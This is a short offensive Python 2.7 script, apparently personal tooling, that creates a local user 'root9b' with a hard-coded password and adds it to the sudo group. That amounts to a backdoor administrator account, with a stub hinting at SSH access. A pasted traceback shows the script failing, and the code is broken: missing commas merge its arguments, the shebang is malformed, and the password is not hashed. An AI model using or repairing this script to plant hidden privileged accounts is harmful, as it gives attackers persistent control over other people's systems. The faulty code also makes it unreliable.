#/usr/bin/python2.7

import subprocess

def addsudoer():
    subprocess.check_output(['/usr/sbin/useradd' '-m' '-p' '9btoor', 'root9b'])
###    subprocess.check_output(['/usr/sbin/useradd' '-m' '-p' '9btoor', '-s', '/bin/bash' 'root9b'])

    subprocess.check_output(['/usr/sbin/usermod', '-aG', 'sudo', 'root9b'])

#def add sshuser():


addsudoer()

# ~/g/Offensive_Python ❯❯❯ sudo python add_sudo_ssh_user.py 
# Traceback (most recent call last):
#  File "add_sudo_ssh_user.py", line 14, in <module>
#    addsudoer()
#  File "add_sudo_ssh_user.py", line 6, in addsudoer
#    subprocess.check_output(['/usr/sbin/useradd' '-m' '-p' '9btoor', 'root9b'])
#  File "/usr/lib/python2.7/subprocess.py", line 212, in check_output
#    process = Popen(stdout=PIPE, *popenargs, **kwargs)
#  File "/usr/lib/python2.7/subprocess.py", line 390, in __init__
#    errread, errwrite)
#  File "/usr/lib/python2.7/subprocess.py", line 1024, in _execute_child
#    raise child_exception
#OSError: [Errno 2] No such file or directory
